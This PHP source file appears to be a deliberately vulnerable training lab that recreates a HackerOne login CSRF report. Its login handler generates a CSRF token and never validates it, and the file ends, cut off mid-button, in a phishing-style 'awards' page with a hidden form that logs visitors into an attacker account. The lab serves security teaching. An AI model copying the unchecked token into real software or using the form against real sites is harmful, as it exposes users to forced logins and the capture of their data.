<?php
// Lab 1301 — Login CSRF Token Bypass (HackerOne #834366)
// Vulnerability: authenticity_token is generated and placed in the login form but NEVER
// validated server-side. Any POST to /users/sign_in succeeds regardless of token.
// Full attack: attacker force-logs victim into attacker's account via cross-origin form submit.
// Default accounts: victim@hackerone.com / victim123  |  attacker@evil.com / attacker456

session_start();

$db = new mysqli('localhost', 'root', '', 'KrazePlanet_DB');
if ($db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
}

$scheme  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$labBase = $scheme . '://' . $_SERVER['HTTP_HOST'] . '/index.php';

// ── Auto-create table (self-contained, no external SQL needed) ────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1301 (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    email      VARCHAR(255) NOT NULL UNIQUE,
    password   VARCHAR(255) NOT NULL,
    username   VARCHAR(100) NOT NULL,
    reputation INT          DEFAULT 100,
    bounties   INT          DEFAULT 0,
    rank_num   INT          DEFAULT 5000,
    sig_score  DECIMAL(3,1) DEFAULT 5.0,
    impact     DECIMAL(3,1) DEFAULT 5.0,
    created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
)");

// ── Seed default accounts (first run only) ────────────────────────────────────
$sc = $db->query("SELECT COUNT(*) FROM lab1301 WHERE email IN ('zara.hunt@hackerone.com','noah.carter@hackerone.com','ava.patel@hackerone.com','attacker@evil.com')")->fetch_row()[0];
if ($sc < 4) {
    $h1 = password_hash('zara@123',    PASSWORD_BCRYPT);
    $h2 = password_hash('noah@123',    PASSWORD_BCRYPT);
    $h3 = password_hash('ava@123',     PASSWORD_BCRYPT);
    $ah = password_hash('attacker456', PASSWORD_BCRYPT);
    $db->query("INSERT IGNORE INTO lab1301 (email,password,username,reputation,bounties,rank_num,sig_score,impact) VALUES
        ('zara.hunt@hackerone.com',  '$h1','zara_hunt',    842,  5200, 3241,6.8,7.2),
        ('noah.carter@hackerone.com','$h2','noah_carter', 1205,  8750, 2187,7.1,7.8),
        ('ava.patel@hackerone.com',  '$h3','ava_patel',    634,  3100, 4532,6.2,6.9),
        ('attacker@evil.com',        '$ah','evil_hacker',   10,     0,98765,1.0,1.0)");
}

// ── CSRF token — generated, NEVER validated (the vulnerability) ──────────────
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrfToken = $_SESSION['csrf_token'];

// ── Routing ───────────────────────────────────────────────────────────────────
$action = $_GET['action'] ?? '';
$attack = isset($_GET['attack']);
$error  = '';

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $labBase);
    exit;
}

// ── Load session user ─────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['user_id'])) {
    $st = $db->prepare("SELECT * FROM lab1301 WHERE id = ?");
    $st->bind_param('i', $_SESSION['user_id']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── POST: Register ────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'register') {
    $username = trim($_POST['username'] ?? '');
    $email    = trim($_POST['email']    ?? '');
    $password = $_POST['password']       ?? '';
    if ($username && $email && $password) {
        $hash = password_hash($password, PASSWORD_BCRYPT);
        $st = $db->prepare("INSERT INTO lab1301 (email, password, username) VALUES (?, ?, ?)");
        $st->bind_param('sss', $email, $hash, $username);
        if ($st->execute()) {
            $_SESSION['user_id']  = $db->insert_id;
            $_SESSION['username'] = $username;
            $st->close();
            header('Location: ' . $labBase);
            exit;
        }
        $error = 'That email address is already registered.';
        $st->close();
    } else {
        $error = 'All fields are required.';
    }
}

// ── POST: Login — VULNERABLE (authenticity_token never checked) ───────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action !== 'register') {
    $email    = $_POST['user']['email']    ?? '';
    $password = $_POST['user']['password'] ?? '';
    // ⚠ VULNERABLE: $_POST['authenticity_token'] is received but NEVER compared to
    // $_SESSION['csrf_token'] — any POST to this endpoint succeeds regardless of token.
    if ($email && $password) {
        $st = $db->prepare("SELECT * FROM lab1301 WHERE email = ?");
        $st->bind_param('s', $email);
        $st->execute();
        $row = $st->get_result()->fetch_assoc();
        $st->close();
        if ($row && password_verify($password, $row['password'])) {
            $_SESSION['user_id']  = $row['id'];
            $_SESSION['username'] = $row['username'];
            header('Location: ' . $labBase);
            exit;
        }
        $error = 'Invalid email or password.';
    } else {
        $error = 'Email and password are required.';
    }
}

// ── Report data keyed by username ─────────────────────────────────────────────
$reportSets = [
    'security_researcher' => [
        ['title'=>'Login CSRF vulnerability on hackerone.com',     'prog'=>'HackerOne Bug Bounty','status'=>'resolved',   'bounty'=>500, 'date'=>'Mar 30, 2020'],
        ['title'=>'Stored XSS via username field in profile page', 'prog'=>'Shopify Bug Bounty',  'status'=>'resolved',   'bounty'=>300, 'date'=>'Feb 14, 2020'],
        ['title'=>'IDOR allows viewing private report details',     'prog'=>'HackerOne Bug Bounty','status'=>'triaged',    'bounty'=>250, 'date'=>'Jan 28, 2020'],
        ['title'=>'Rate limit bypass on password reset endpoint',   'prog'=>'Twitter VDP',         'status'=>'resolved',   'bounty'=>200, 'date'=>'Jan 12, 2020'],
        ['title'=>'SQL injection via search query parameter',       'prog'=>'Slack Bug Bounty',    'status'=>'duplicate',  'bounty'=>0,   'date'=>'Dec 22, 2019'],
        ['title'=>'Open redirect via logout redirect_to parameter', 'prog'=>'Shopify Bug Bounty',  'status'=>'informative','bounty'=>0,   'date'=>'Dec 8, 2019'],
        ['title'=>'Missing HTTPS on admin subdomain',               'prog'=>'Twitter VDP',         'status'=>'new',        'bounty'=>-1,  'date'=>'Apr 2, 2020'],
    ],
    'evil_hacker' => [],
];
$uname   = $currentUser['username'] ?? '';
$reports = $reportSets[$uname] ?? [];

function statusBadge(string $s): string {
    $m = ['new'=>'db-badge-new','triaged'=>'db-badge-triaged','resolved'=>'db-badge-resolved',
          'duplicate'=>'db-badge-dup','informative'=>'db-badge-info'];
    return '<span class="db-badge '.($m[$s]??'db-badge-new').'">'.ucfirst($s).'</span>';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?php
    if ($currentUser)          echo 'Dashboard — HackerOne';
    elseif ($attack)           echo 'HackerOne Bug Bounty Awards 2020';
    elseif ($action==='register') echo 'Join HackerOne';
    else                       echo 'Sign In — HackerOne';
?></title>
<style>
/* ── Reset ────────────────────────────────────────────────────────────────── */
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;background:#fff;color:#1b2030;}
a{text-decoration:none;color:inherit;}
button{font-family:inherit;cursor:pointer;}

/* ── Marketing Navbar (sign-in page only) ─────────────────────────────────── */
.mkt-nav{height:60px;border-bottom:1px solid #e8eaed;display:flex;align-items:center;padding:0 32px;position:sticky;top:0;background:#fff;z-index:900;}
.mkt-logo{display:flex;align-items:center;gap:10px;}
.mkt-logo-mark{width:34px;height:34px;background:#25a244;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:.85rem;color:#fff;font-family:monospace;letter-spacing:-1px;}
.mkt-logo-text{font-size:1.05rem;font-weight:700;color:#1b2030;letter-spacing:-.4px;}
.mkt-nav-links{display:flex;gap:2px;margin-left:32px;}
.mkt-nav-link{padding:8px 14px;font-size:.82rem;font-weight:500;color:#555;border-radius:5px;}
.mkt-nav-link:hover{background:#f5f5f5;color:#1b2030;}
.mkt-nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.mkt-btn-outline{padding:8px 18px;border:1.5px solid #d0d5dd;border-radius:6px;font-size:.82rem;font-weight:600;color:#1b2030;background:#fff;}
.mkt-btn-outline:hover{background:#f8f8f8;}
.mkt-btn-green{padding:8px 18px;background:#25a244;border:none;border-radius:6px;font-size:.82rem;font-weight:600;color:#fff;}
.mkt-btn-green:hover{background:#1d8a37;}

/* ── Sign-in Split Layout ─────────────────────────────────────────────────── */
.si-wrap{display:grid;grid-template-columns:1fr 1fr;min-height:calc(100vh - 60px);}
@media(max-width:800px){.si-wrap{grid-template-columns:1fr;}.si-left{display:none;}}

/* Left dark panel */
.si-left{background:#1b2030;padding:56px 48px;display:flex;flex-direction:column;justify-content:center;}
.si-left-logo{display:flex;align-items:center;gap:12px;margin-bottom:48px;}
.si-left-logo-mark{width:44px;height:44px;background:#25a244;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:1rem;color:#fff;font-family:monospace;letter-spacing:-1px;}
.si-left-logo-text{font-size:1.3rem;font-weight:700;color:#fff;letter-spacing:-.5px;}
.si-tagline{font-size:1.6rem;font-weight:800;color:#fff;line-height:1.3;margin-bottom:16px;}
.si-tagline span{color:#25a244;}
.si-sub{font-size:.88rem;color:rgba(255,255,255,.6);line-height:1.7;margin-bottom:40px;}
.si-stats{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:40px;}
.si-stat{padding:16px;background:rgba(255,255,255,.06);border-radius:8px;border:1px solid rgba(255,255,255,.08);}
.si-stat-num{font-size:1.4rem;font-weight:800;color:#fff;margin-bottom:4px;}
.si-stat-label{font-size:.72rem;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.5px;}
.si-trusted-label{font-size:.7rem;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.8px;margin-bottom:12px;}
.si-trusted-logos{display:flex;flex-wrap:wrap;gap:8px;}
.si-trusted-logo{padding:5px 12px;border:1px solid rgba(255,255,255,.12);border-radius:4px;font-size:.7rem;font-weight:600;color:rgba(255,255,255,.5);}

/* Right white panel */
.si-right{display:flex;align-items:center;justify-content:center;padding:48px 32px;background:#fff;}
.si-form-wrap{width:100%;max-width:400px;}
.si-form-title{font-size:1.5rem;font-weight:800;color:#1b2030;margin-bottom:6px;}
.si-form-sub{font-size:.84rem;color:#888;margin-bottom:32px;}
.si-field{margin-bottom:18px;}
.si-field-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;}
.si-label{font-size:.8rem;font-weight:600;color:#374151;}
.si-forgot{font-size:.78rem;color:#25a244;font-weight:500;}
.si-forgot:hover{text-decoration:underline;}
.si-input{width:100%;border:1.5px solid #e5e7eb;border-radius:7px;padding:11px 14px;font-size:.9rem;color:#1b2030;outline:none;transition:border-color .15s,box-shadow .15s;background:#fff;}
.si-input:focus{border-color:#25a244;box-shadow:0 0 0 3px rgba(37,162,68,.1);}
.si-input::placeholder{color:#bbb;}
.si-remember{display:flex;align-items:center;gap:8px;font-size:.8rem;color:#555;margin-bottom:20px;}
.si-remember input{accent-color:#25a244;width:14px;height:14px;}
.si-submit{width:100%;background:#25a244;color:#fff;border:none;border-radius:7px;padding:12px;font-size:.9rem;font-weight:700;letter-spacing:.1px;}
.si-submit:hover{background:#1d8a37;}
.si-divider{display:flex;align-items:center;gap:14px;margin:22px 0;color:#d1d5db;font-size:.75rem;}
.si-divider::before,.si-divider::after{content:'';flex:1;height:1px;background:#e5e7eb;}
.si-oauth{width:100%;border:1.5px solid #e5e7eb;background:#fff;border-radius:7px;padding:11px 14px;display:flex;align-items:center;justify-content:center;gap:10px;font-size:.84rem;font-weight:600;color:#374151;margin-bottom:10px;}
.si-oauth:hover{background:#f9fafb;border-color:#d1d5db;}
.si-oauth-github{background:#24292e;border-color:#24292e;color:#fff;}
.si-oauth-github:hover{background:#1a1f24;}
.si-saml{display:block;text-align:center;font-size:.78rem;color:#25a244;margin-top:6px;font-weight:500;}
.si-saml:hover{text-decoration:underline;}
.si-signup{text-align:center;font-size:.8rem;color:#9ca3af;margin-top:28px;padding-top:22px;border-top:1px solid #f3f4f6;}
.si-signup a{color:#25a244;font-weight:600;}
.si-signup a:hover{text-decoration:underline;}

/* ── Dashboard Topbar ─────────────────────────────────────────────────────── */
.db-nav{background:#1b2030;height:56px;display:flex;align-items:center;padding:0 24px;position:sticky;top:0;z-index:900;gap:0;}
.db-nav-logo{display:flex;align-items:center;gap:9px;margin-right:8px;}
.db-nav-logo-mark{width:30px;height:30px;background:#25a244;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:.75rem;color:#fff;font-family:monospace;}
.db-nav-logo-text{font-size:.92rem;font-weight:700;color:#fff;}
.db-nav-links{display:flex;margin-left:12px;}
.db-nav-link{padding:8px 13px;font-size:.78rem;font-weight:500;color:rgba(255,255,255,.6);border-radius:4px;}
.db-nav-link:hover,.db-nav-link.active{color:#fff;background:rgba(255,255,255,.09);}
.db-nav-right{margin-left:auto;display:flex;align-items:center;gap:14px;}
.db-notif{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border-radius:50%;color:rgba(255,255,255,.6);position:relative;cursor:pointer;}
.db-notif:hover{color:#fff;background:rgba(255,255,255,.08);}
.db-notif-badge{position:absolute;top:3px;right:3px;width:8px;height:8px;background:#25a244;border-radius:50%;border:2px solid #1b2030;}
.db-avatar{width:32px;height:32px;border-radius:50%;background:#25a244;display:flex;align-items:center;justify-content:center;font-size:.72rem;font-weight:800;color:#fff;cursor:pointer;}
.db-username{font-size:.78rem;color:rgba(255,255,255,.75);font-weight:600;}
.db-rep-badge{background:rgba(37,162,68,.2);color:#4ade80;font-size:.68rem;font-weight:700;padding:2px 8px;border-radius:10px;}

/* ── Dashboard Layout ─────────────────────────────────────────────────────── */
.db-layout{display:grid;grid-template-columns:240px 1fr;min-height:calc(100vh - 56px);background:#f5f7fb;}
@media(max-width:860px){.db-layout{grid-template-columns:1fr;}}

/* Sidebar */
.db-sidebar{background:#fff;border-right:1px solid #e8eaed;padding:24px 16px;}
.db-profile-card{text-align:center;padding:20px 12px;margin-bottom:16px;}
.db-profile-avatar{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,#25a244,#1d6a35);margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;font-weight:900;color:#fff;}
.db-profile-name{font-size:.95rem;font-weight:800;color:#1b2030;margin-bottom:2px;}
.db-profile-handle{font-size:.78rem;color:#888;margin-bottom:14px;}
.db-profile-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:14px;}
.db-profile-stat{text-align:center;padding:8px 4px;background:#f5f7fb;border-radius:6px;}
.db-profile-stat-num{font-size:.95rem;font-weight:800;color:#1b2030;}
.db-profile-stat-label{font-size:.6rem;color:#aaa;text-transform:uppercase;letter-spacing:.4px;margin-top:2px;}
.db-profile-rank{font-size:.75rem;color:#888;background:#f5f7fb;border-radius:5px;padding:6px 10px;text-align:center;}
.db-profile-rank strong{color:#25a244;}
.db-sidebar-nav{margin-top:8px;}
.db-sidebar-nav-item{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:6px;font-size:.82rem;font-weight:500;color:#555;cursor:pointer;margin-bottom:2px;}
.db-sidebar-nav-item:hover{background:#f5f7fb;color:#1b2030;}
.db-sidebar-nav-item.active{background:#f0fdf4;color:#25a244;font-weight:600;}
.db-sidebar-nav-item svg{width:15px;height:15px;flex-shrink:0;}

/* Main content */
.db-main{padding:24px;}
.db-stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px;}
@media(max-width:700px){.db-stats-row{grid-template-columns:1fr 1fr;}}
.db-stat-card{background:#fff;border-radius:8px;padding:18px 20px;box-shadow:0 1px 3px rgba(0,0,0,.06);}
.db-stat-card-num{font-size:1.6rem;font-weight:800;color:#1b2030;line-height:1;}
.db-stat-card-label{font-size:.72rem;color:#888;text-transform:uppercase;letter-spacing:.5px;margin-top:6px;}
.db-stat-card-delta{font-size:.72rem;color:#25a244;font-weight:600;margin-top:4px;}
.db-section{background:#fff;border-radius:8px;padding:20px;margin-bottom:20px;box-shadow:0 1px 3px rgba(0,0,0,.06);}
.db-section-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;}
.db-section-title{font-size:.9rem;font-weight:700;color:#1b2030;}
.db-section-link{font-size:.78rem;color:#25a244;font-weight:600;}
.db-section-link:hover{text-decoration:underline;}
table.db-table{width:100%;border-collapse:collapse;font-size:.8rem;}
.db-table th{text-align:left;font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:#9ca3af;padding:0 12px 10px 0;border-bottom:1px solid #f3f4f6;}
.db-table td{padding:12px 12px 12px 0;border-bottom:1px solid #f9fafb;color:#374151;vertical-align:middle;}
.db-table tr:last-child td{border-bottom:none;}
.db-table tr:hover td{background:#fafafa;}
.db-report-title{font-weight:600;color:#1b2030;max-width:280px;}
.db-report-program{font-size:.72rem;color:#888;margin-top:2px;}
.db-badge{display:inline-flex;align-items:center;padding:3px 9px;border-radius:10px;font-size:.7rem;font-weight:700;white-space:nowrap;}
.db-badge-new{background:#dbeafe;color:#1d4ed8;}
.db-badge-triaged{background:#fef3c7;color:#d97706;}
.db-badge-resolved{background:#d1fae5;color:#059669;}
.db-badge-dup{background:#f3f4f6;color:#6b7280;}
.db-badge-info{background:#fee2e2;color:#dc2626;}
.db-bounty{font-weight:700;color:#25a244;}
.db-bounty-nil{color:#d1d5db;}
.db-programs-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;}
@media(max-width:600px){.db-programs-grid{grid-template-columns:1fr;}}
.db-prog-card{border:1px solid #e8eaed;border-radius:7px;padding:14px;display:flex;align-items:center;gap:12px;}
.db-prog-card:hover{border-color:#25a244;background:#f0fdf4;}
.db-prog-icon{width:38px;height:38px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:1.1rem;flex-shrink:0;}
.db-prog-name{font-size:.82rem;font-weight:700;color:#1b2030;margin-bottom:2px;}
.db-prog-type{font-size:.7rem;color:#888;}
/* ── Error alert ──────────────────────────────────────────────────────────── */
.si-error{background:#fef2f2;border:1px solid #fca5a5;border-radius:6px;padding:10px 14px;font-size:.8rem;color:#dc2626;margin-bottom:16px;}
/* ── Attack page ──────────────────────────────────────────────────────────── */
.atk-page{min-height:100vh;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);display:flex;align-items:center;justify-content:center;padding:32px;}
.atk-card{background:#fff;border-radius:16px;max-width:520px;width:100%;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5);}
.atk-header{background:linear-gradient(135deg,#667eea,#764ba2);padding:32px;text-align:center;color:#fff;}
.atk-header h1{font-size:1.4rem;font-weight:800;margin-bottom:8px;}
.atk-header p{font-size:.84rem;opacity:.88;line-height:1.6;}
.atk-body{padding:28px 32px;}
.atk-award{text-align:center;font-size:3.5rem;margin-bottom:18px;}
.atk-para{font-size:.84rem;color:#555;line-height:1.7;margin-bottom:20px;text-align:center;}
.atk-btn{display:block;width:100%;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;padding:14px;font-size:.92rem;font-weight:700;cursor:pointer;font-family:inherit;}
.atk-btn:hover{opacity:.9;}
.atk-fine{text-align:center;font-size:.68rem;color:#bbb;margin-top:10px;}
.atk-footer{padding:16px 32px;border-top:1px solid #f3f4f6;display:flex;justify-content:space-between;font-size:.7rem;color:#aaa;}
.atk-footer a{color:#667eea;}
/* ── Register page additions ─────────────────────────────────────────────── */
.si-form-title-sm{font-size:1.2rem;font-weight:800;color:#1b2030;margin-bottom:4px;}
.si-form-sub-sm{font-size:.82rem;color:#888;margin-bottom:28px;}
/* ── Test accounts card ──────────────────────────────────────────────────── */
.accs{background:#fff;border:1px solid #e5e7eb;border-radius:6px;padding:.85rem 1rem;margin-top:1rem;font-size:12px;max-width:400px;width:100%;}
.accs h4{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#9ca3af;margin-bottom:.5rem;}
.acc-r{display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid #f3f4f6;}
.acc-r:last-child{border-bottom:none;}
.acc-r .ae{color:#6b7280;flex:1;font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.acc-r .ap{font-family:monospace;font-weight:700;color:#111827;font-size:11px;white-space:nowrap;}
.ab{font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;white-space:nowrap;}
.ab-user{background:#dbeafe;color:#1d4ed8;}
.ab-admin{background:#fef3c7;color:#92400e;}
</style>
</head>
<body>

<?php
$initials = '';
$repFmt   = '0';
$bntFmt   = '$0';
$rankFmt  = 'N/A';
$rptCount = count($reports);
if ($currentUser) {
    $initials = strtoupper(substr($currentUser['username'], 0, 2));
    $repFmt   = number_format($currentUser['reputation']);
    $bntFmt   = '$' . number_format($currentUser['bounties']);
    $rankFmt  = '#' . number_format($currentUser['rank_num']);
}
?>
<?php if ($currentUser): ?>
<!-- ═══════════════════════════════════════════════════════════════════════════
     DASHBOARD — dynamic from MySQL
═══════════════════════════════════════════════════════════════════════════ -->
<nav class="db-nav">
  <div class="db-nav-logo">
    <div class="db-nav-logo-mark">h1</div>
    <span class="db-nav-logo-text">HackerOne</span>
  </div>
  <div class="db-nav-links">
    <a href="#" class="db-nav-link active">Hacktivity</a>
    <a href="#" class="db-nav-link">Programs</a>
    <a href="#" class="db-nav-link">Leaderboard</a>
    <a href="#" class="db-nav-link">Inbox <span style="background:#25a244;color:#fff;font-size:.6rem;padding:1px 5px;border-radius:8px;margin-left:3px;">3</span></a>
    <a href="#" class="db-nav-link">Points</a>
  </div>
  <div class="db-nav-right">
    <div class="db-notif">
      <svg width="17" height="17" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg>
      <span class="db-notif-badge"></span>
    </div>
    <span class="db-username">@<?php echo htmlspecialchars($currentUser['username']); ?></span>
    <span class="db-rep-badge"><?php echo $repFmt; ?> rep</span>
    <div class="db-avatar"><?php echo $initials; ?></div>
  </div>
</nav>

<div class="db-layout">
  <aside class="db-sidebar">
    <div class="db-profile-card">
      <div class="db-profile-avatar"><?php echo $initials; ?></div>
      <div class="db-profile-name"><?php echo htmlspecialchars($currentUser['username']); ?></div>
      <div class="db-profile-handle">@<?php echo htmlspecialchars($currentUser['username']); ?> · <?php echo htmlspecialchars($currentUser['email']); ?></div>
      <div class="db-profile-stats">
        <div class="db-profile-stat"><div class="db-profile-stat-num"><?php echo $rptCount ?: '0'; ?></div><div class="db-profile-stat-label">Reports</div></div>
        <div class="db-profile-stat"><div class="db-profile-stat-num"><?php echo $bntFmt; ?></div><div class="db-profile-stat-label">Bounties</div></div>
        <div class="db-profile-stat"><div class="db-profile-stat-num"><?php echo $currentUser['sig_score']; ?></div><div class="db-profile-stat-label">Signal</div></div>
      </div>
      <div class="db-profile-rank">Global Rank: <strong><?php echo $rankFmt; ?></strong> · Impact <strong><?php echo $currentUser['impact']; ?></strong></div>
    </div>
    <nav class="db-sidebar-nav">
      <div class="db-sidebar-nav-item active">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>Dashboard
      </div>
      <div class="db-sidebar-nav-item">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>My Reports
      </div>
      <div class="db-sidebar-nav-item">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>Programs
      </div>
      <div class="db-sidebar-nav-item">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/></svg>Leaderboard
      </div>
      <div class="db-sidebar-nav-item">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><circle cx="12" cy="12" r="3"/></svg>Settings
      </div>
      <div style="margin-top:16px;padding-top:16px;border-top:1px solid #f3f4f6;">
        <a href="<?php echo $labBase; ?>?logout=1" class="db-sidebar-nav-item" style="color:#dc2626;">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>Sign out
        </a>
      </div>
    </nav>
  </aside>

  <main class="db-main">
    <div class="db-stats-row">
      <div class="db-stat-card">
        <div class="db-stat-card-num"><?php echo $repFmt; ?></div>
        <div class="db-stat-card-label">Points</div>
        <div class="db-stat-card-delta">Signal <?php echo $currentUser['sig_score']; ?></div>
      </div>
      <div class="db-stat-card">
        <div class="db-stat-card-num"><?php echo $rptCount; ?></div>
        <div class="db-stat-card-label">Reports Submitted</div>
        <div class="db-stat-card-delta"><?php echo count(array_filter($reports, fn($r)=>$r['status']==='resolved')); ?> resolved</div>
      </div>
      <div class="db-stat-card">
        <div class="db-stat-card-num"><?php echo $bntFmt; ?></div>
        <div class="db-stat-card-label">Total Bounties</div>
        <div class="db-stat-card-delta">Impact <?php echo $currentUser['impact']; ?></div>
      </div>
      <div class="db-stat-card">
        <div class="db-stat-card-num"><?php echo $rankFmt; ?></div>
        <div class="db-stat-card-label">Global Rank</div>
        <div class="db-stat-card-delta">All-time ranking</div>
      </div>
    </div>

    <div class="db-section">
      <div class="db-section-header">
        <span class="db-section-title">My Reports</span>
        <a href="#" class="db-section-link">View all →</a>
      </div>
      <?php if (empty($reports)): ?>
      <div style="text-align:center;padding:32px;color:#9ca3af;font-size:.84rem;">
        <div style="font-size:2rem;margin-bottom:8px;">📭</div>
        No reports submitted yet.
      </div>
      <?php else: ?>
      <table class="db-table">
        <thead><tr><th>Title</th><th>Status</th><th>Bounty</th><th>Submitted</th></tr></thead>
        <tbody>
        <?php foreach ($reports as $r): ?>
          <tr>
            <td><div class="db-report-title"><?php echo htmlspecialchars($r['title']); ?></div><div class="db-report-program"><?php echo htmlspecialchars($r['prog']); ?></div></td>
            <td><?php echo statusBadge($r['status']); ?></td>
            <td><?php if ($r['bounty'] > 0): ?><span class="db-bounty">$<?php echo number_format($r['bounty']); ?></span><?php elseif ($r['bounty'] === -1): ?><span class="db-bounty-nil">Pending</span><?php else: ?><span class="db-bounty-nil">—</span><?php endif; ?></td>
            <td style="color:#9ca3af;"><?php echo $r['date']; ?></td>
          </tr>
        <?php endforeach; ?>
        </tbody>
      </table>
      <?php endif; ?>
    </div>

    <div class="db-section">
      <div class="db-section-header">
        <span class="db-section-title">Subscribed Programs</span>
        <a href="#" class="db-section-link">Browse programs →</a>
      </div>
      <div class="db-programs-grid">
        <div class="db-prog-card"><div class="db-prog-icon" style="background:#f0fdf4;">🐛</div><div><div class="db-prog-name">HackerOne Bug Bounty</div><div class="db-prog-type">Managed · Bounty</div></div></div>
        <div class="db-prog-card"><div class="db-prog-icon" style="background:#fffbeb;">🛍</div><div><div class="db-prog-name">Shopify</div><div class="db-prog-type">Managed · Bounty</div></div></div>
        <div class="db-prog-card"><div class="db-prog-icon" style="background:#eff6ff;">🐦</div><div><div class="db-prog-name">Twitter VDP</div><div class="db-prog-type">Managed · VDP</div></div></div>
        <div class="db-prog-card"><div class="db-prog-icon" style="background:#fdf4ff;">💬</div><div><div class="db-prog-name">Slack Bug Bounty</div><div class="db-prog-type">Managed · Bounty</div></div></div>
      </div>
    </div>
  </main>
</div>

<?php elseif ($attack): ?>
<!-- ═══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — simulated malicious external website
═══════════════════════════════════════════════════════════════════════════ -->
<div class="atk-page">
  <div class="atk-card">
    <div class="atk-header">
      <h1>🏆 HackerOne Bug Bounty Awards 2020</h1>
      <p>Annual recognition for outstanding security researchers worldwide</p>
    </div>
    <div class="atk-body">
      <div class="atk-award">🎖️</div>
      <p class="atk-para">
        Congratulations! You have been nominated for the <strong>HackerOne Annual Hacker Award 2020</strong>.<br><br>
        Click the button below to verify your identity and confirm your participation. This only takes a moment.
      </p>

      <!-- ⚠ Hidden CSRF form: posts to index.php with ATTACKER's credentials, NO authenticity_token -->
      <form id="csrfForm" action="<?php echo $labBase; ?>" method="POST">
        <input type="hidden" name="user[email]"    value="attacker@evil.com">
        <input type="hidden" name="user[password]" value="attacker456">
        <input type="hidden" name="user[remember_me]" value="1">
        <!-- authenticity_token field deliberately omitted -->
      </form>

      <button class="atk-btn" onclick="document.getElementById('csrfForm').submit()">
